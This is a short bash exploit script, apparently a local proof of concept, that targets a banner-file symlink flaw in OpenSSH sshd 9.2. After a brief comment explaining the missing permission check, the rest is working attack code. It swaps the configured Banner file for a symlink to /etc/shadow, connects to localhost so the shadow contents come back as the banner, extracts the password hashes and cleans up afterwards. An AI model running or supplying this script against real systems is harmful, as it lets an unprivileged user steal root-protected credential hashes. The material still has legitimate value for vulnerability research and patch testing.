#!/bin/bash
# By: oxagast
#
# woahisread
# this exploit depends on "Banner" being pointed at a file that
# exists in a dir writeable by the user running the exploit, and
# that the file can be removed/moved by that user.  Basically the
# banner file should be checked for proper permissions, as being
# owned by root and writeable only by root, and sshd fails to do
# this.  This allows you to create a symlink, and read the file
# it points to as the user running the openssh process which is
# normally, root.

echo "[*] WoahIsRead sshd 9.2 banner symbolic link exploit"
BPATH=$(grep -i "^Banner " /etc/ssh/sshd_config | cut -d ' ' -f 2);
VER=$(sshd -V 2>&1 | cut -d ',' -f 1);
echo "[*] SSHD Version:          $VER";
echo "[*] SSHD Banner path is:   $BPATH";
if test -e $BPATH; then
mv $BPATH $BPATH.bak
ln -s /etc/shadow $BPATH
MOV=1;
else
ln -s /etc/shadow $BPATH
fi;
ssh -o BatchMode=true 127.0.0.1 2>&1 | tee /tmp/sshexp.1 >/dev/null
head -n -1 /tmp/sshexp.1 > shadow
rm -f /tmp/sshexp.1
if [[ $(head -n 1 shadow | grep root) ]]; then
grep ':\$.\$' shadow
echo "[!] Exploit complete, cleaning up..."
if [[ MOV -eq 1 ]]; then
mv $BPATH.bak $BPATH
fi
else
echo "[x] Sorry, exploit failed."
fi
